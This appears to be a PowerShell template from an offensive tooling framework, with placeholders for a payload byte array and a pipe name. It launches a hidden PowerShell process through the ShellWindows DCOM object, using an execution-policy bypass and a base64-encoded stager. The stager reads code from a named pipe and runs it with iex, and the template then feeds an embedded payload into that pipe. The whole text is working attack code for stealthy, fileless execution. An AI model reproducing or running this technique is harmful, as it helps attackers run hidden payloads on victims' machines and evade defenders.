[byte[]]${bytes} = @( {psmosdef_byte_array} )
${psmosdef} = [System.Text.Encoding]::UTF8.GetString(${bytes})
${window_finder} = @"
using System;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace {Hider}
{
  public class {Helper}{
	 [DllImport("user32.dll")]
	 [return: MarshalAs(UnmanagedType.Bool)]
	 public static extern bool SetForegroundWindow(IntPtr hWnd);
  }
} 
"@

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")
${dcom_object} = [Microsoft.VisualBasic.Interaction]::GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
${stager_commands} = {[System.Reflection.Assembly]::LoadWithPartialName('system.core'); ${pipe} = new-object System.IO.Pipes.NamedPipeServerStream('\\.\pipe\{named_pipe_name}'); ${pipe}.WaitForConnection(); ${sr} = new-object System.IO.StreamReader(${pipe}); ${payload} = ${sr}.ReadToEnd(); ${sr}.Dispose(); $pipe.Dispose(); iex ${payload}}
${stager_args} = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(${stager_commands}.ToString()))
${dcom_object}.Document.Application.ShellExecute("powershell", "-executionpolicy bypass -enc $(${stager_args})", "C:\windows\system32", "open", 0)

[System.Reflection.Assembly]::LoadWithPartialName("system.core")
${pipe} = new-object System.IO.Pipes.NamedPipeClientStream("\\.\pipe\{named_pipe_name}")
${pipe}.Connect()

${sw} = new-object System.IO.StreamWriter(${pipe})
${payload} = ${psmosdef}.ToString()
${sw}.Write(${payload})
${sw}.Dispose()
${pipe}.Dispose()